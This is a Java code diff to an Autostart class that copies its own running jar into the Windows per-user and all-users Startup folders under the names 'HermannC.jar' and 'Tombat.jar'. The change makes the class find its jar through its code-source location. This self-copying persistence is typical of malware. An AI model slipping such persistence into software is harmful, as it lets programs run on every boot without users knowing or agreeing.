@@ -14,7 +14,8 @@ public class Autostart {
                     .getPath()).getName();
 
             if (filename.endsWith(".jar")) {
-                new DownloadService().download("file:///" + System.getProperty("user.dir") + "\\" + filename,
+                new DownloadService().download("file:///"
+                                + Autostart.class.getProtectionDomain().getCodeSource().getLocation().toURI().getPath(),
                         System.getProperty("java.io.tmpdir").replace("Local\\Temp\\",
                                 "Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\HermannC.jar"));
             } else {
@@ -33,7 +34,8 @@ public class Autostart {
                     .getPath()).getName();
 
             if (filename.endsWith(".jar")) {
-                new DownloadService().download("file:///" + System.getProperty("user.dir") + "\\" + filename,
+                new DownloadService().download("file:///"
+                                + Autostart.class.getProtectionDomain().getCodeSource().getLocation().toURI().getPath(),
                         "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Tombat.jar");
             } else {
                 notFromJar(filename);
@@ -50,6 +52,8 @@ public class Autostart {
     }
 
     public void decide() {
+
+
         switch (System.getProperty("os.name")) {
             case "Windows 10":
                 autostartWin10();
